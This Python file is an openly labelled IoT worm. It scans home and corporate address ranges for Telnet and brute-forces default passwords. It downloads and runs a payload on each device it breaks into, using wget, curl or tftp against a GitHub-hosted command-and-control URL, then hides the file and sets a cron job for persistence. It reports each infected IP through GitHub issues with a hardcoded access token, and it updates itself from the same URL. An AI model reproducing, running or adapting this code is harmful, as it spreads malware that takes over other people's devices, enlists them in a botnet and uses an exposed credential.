#!/usr/bin/env python3
# IoT Worm - Final Version with C&C Reporting
import socket
import threading
import subprocess
import requests
import random
import time
from datetime import datetime

# Configuration
GITHUB_TOKEN = "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"  # Replace with your GitHub token
GITHUB_REPO = "largevolumebykofe/network-monitor"  # Replace with your repo
C2_SERVER = "https://raw.githubusercontent.com/largevolumebykofe/network-monitor/main/worm.py"

def network_scan():
    """Scan network for vulnerable IoT devices"""
    networks = [
        "192.168.1.{}",    # Home network
        "192.168.0.{}",    # Alternative home
        "10.0.0.{}",       # Business network
        "172.16.1.{}"      # Corporate
    ]
    
    found_devices = []
    for network_base in networks:
        for i in range(1, 255):
            target_ip = network_base.format(i)
            # Skip router and localhost
            if target_ip.endswith('.1') or target_ip.endswith('.0'):
                continue
                
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target_ip, 23))  # Telnet
                if result == 0:
                    found_devices.append(target_ip)
                sock.close()
            except:
                continue
    return found_devices

def try_login(ip):
    """Attempt login with common credentials"""
    credentials = [
        ("admin", "admin"), ("root", "root"), ("user", "user"),
        ("admin", "password"), ("root", "1234"), ("admin", "1234"),
        ("root", "default"), ("admin", "default"), ("support", "support"),
        ("tech", "tech"), ("guest", "guest"), ("Administrator", "admin")
    ]
    
    for username, password in credentials:
        if telnet_login(ip, username, password):
            return True
    return False

def telnet_login(ip, username, password):
    """Perform Telnet login"""
    try:
        tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tn.settimeout(5)
        tn.connect((ip, 23))
        
        # Wait for login prompt
        time.sleep(1)
        tn.send((username + "\r\n").encode())
        time.sleep(1)
        tn.send((password + "\r\n").encode())
        time.sleep(1)
        
        # Check if login successful
        tn.send("echo 'success'\r\n".encode())
        response = tn.recv(1024)
        tn.close()
        
        if b'success' in response:
            return True
    except:
        pass
    return False

def execute_remote(ip, command):
    """Execute command on remote device"""
    try:
        tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tn.settimeout(10)
        tn.connect((ip, 23))
        time.sleep(1)
        tn.send(("admin\r\n").encode())  # Use default creds
        time.sleep(1)
        tn.send(("admin\r\n").encode())
        time.sleep(1)
        tn.send((command + "\r\n").encode())
        time.sleep(2)
        tn.close()
        return True
    except:
        return False

def deploy_worm(ip):
    """Deploy worm to target device"""
    download_commands = [
        f"wget {C2_SERVER} -O /tmp/.system_update",
        f"curl -o /tmp/.system_update {C2_SERVER}",
        f"tftp -g -r worm.py -l /tmp/.system_update your-server.com"
    ]
    
    setup_commands = [
        "chmod +x /tmp/.system_update",
        "python3 /tmp/.system_update &",
        "nohup python3 /tmp/.system_update > /dev/null 2>&1 &"
    ]
    
    persistence_commands = [
        "echo '*/10 * * * * python3 /tmp/.system_update' > /tmp/cron_setup",
        "crontab /tmp/cron_setup",
        "rm -f /tmp/cron_setup"
    ]
    
    # Try different download methods
    for dl_cmd in download_commands:
        if execute_remote(ip, dl_cmd):
            break
    
    # Setup and run worm
    for setup_cmd in setup_commands:
        execute_remote(ip, setup_cmd)
    
    # Add persistence
    for persist_cmd in persistence_commands:
        execute_remote(ip, persist_cmd)
    
    # Report success
    report_infection(ip, "iot_device")

def report_infection(ip, device_type):
    """Report infection to GitHub C&C"""
    try:
        url = f"https://api.github.com/repos/{GITHUB_REPO}/issues"
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        data = {
            "title": f"🚩 {ip}",
            "body": f"IP: {ip}\nType: {device_type}\nFirst Seen: {datetime.now()}\nStatus: ACTIVE",
            "labels": ["infected", "iot-device"]
        }
        
        response = requests.post(url, headers=headers, json=data, timeout=10)
        if response.status_code == 201:
            print(f"[+] Reported: {ip}")
        else:
            print(f"[-] Report failed: {ip} - {response.status_code}")
    except Exception as e:
        print(f"[-] Report error: {e}")

def spread_worm():
    """Main spreading function"""
    while True:
        try:
            print("[*] Scanning network...")
            targets = network_scan()
            print(f"[*] Found {len(targets)} potential targets")
            
            for target in targets:
                print(f"[*] Trying {target}...")
                if try_login(target):
                    print(f"[+] Successfully accessed {target}")
                    threading.Thread(target=deploy_worm, args=(target,)).start()
                else:
                    print(f"[-] Failed to access {target}")
            
            # Random delay between scans (5-15 minutes)
            time.sleep(random.randint(300, 900))
            
        except Exception as e:
            print(f"[!] Error in spread_worm: {e}")
            time.sleep(60)

def self_update():
    """Check for updates from C2 server"""
    try:
        response = requests.get(C2_SERVER, timeout=10)
        current_code = open(__file__).read()
        if response.text != current_code:
            print("[*] Updating worm...")
            with open(__file__, 'w') as f:
                f.write(response.text)
            subprocess.Popen(["python3", __file__])
            exit(0)
    except:
        pass

if __name__ == "__main__":
    print("[*] IoT Worm Started")
    
    # Check for updates
    self_update()
    
    # Start multiple spreading threads
    for i in range(3):
        threading.Thread(target=spread_worm).start()
    
    # Keep main thread alive
    while True:
        time.sleep(60)